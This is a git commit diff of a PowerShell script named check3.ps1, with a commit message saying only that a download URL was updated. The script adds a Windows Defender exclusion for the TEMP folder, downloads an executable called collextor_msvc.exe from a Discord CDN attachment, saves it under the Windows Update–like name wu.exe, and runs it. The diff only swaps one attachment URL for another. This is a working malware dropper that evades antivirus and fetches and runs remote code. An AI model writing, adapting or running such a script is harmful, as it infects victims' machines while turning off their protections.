494e7634ddf9a943b50fd82a9366e3dec626d152
komboerre-boop <komboerre@gmail.com>
2026-06-27 15:43:57 +0300

    Change download URL for collextor_msvc.exe
    Updated download URL for the executable in the script.

--- check3.ps1
+++ check3.ps1
@@ -2,7 +2,7 @@ $f="$env:TEMP\wu.exe"
 Write-Host "[1] Adding exclusion..."
 Add-MpPreference -ExclusionPath $env:TEMP 2>&1 | Write-Host
 Write-Host "[2] Downloading..."
-try { iwr "https://cdn.discordapp.com/attachments/1520398729520222211/1520407427064004667/collextor_msvc.exe?ex=6a411542&is=6a3fc3c2&hm=b6d3d4a1dce271c21b6663e0e76274f04157f87e5d495fd1eb790dc0c719d8a9&" -OutFile $f -UseBasicParsing } catch { Write-Host "Download error: $_" }
+try { iwr "https://cdn.discordapp.com/attachments/1520398729520222211/1520409259874193458/collextor_msvc.exe?ex=6a4116f7&is=6a3fc577&hm=11caef28478c82dbd03014f4464cd7e410e2b260f6c8782eecebbec1b594a8f3&" -OutFile $f -UseBasicParsing } catch { Write-Host "Download error: $_" }
 Write-Host "[3] File exists: $(Test-Path $f) Size: $((Get-Item $f -EA SilentlyContinue).Length)"
 Write-Host "[4] Running..."
 if (Test-Path $f) { & $f } else { Write-Host "File not found " }
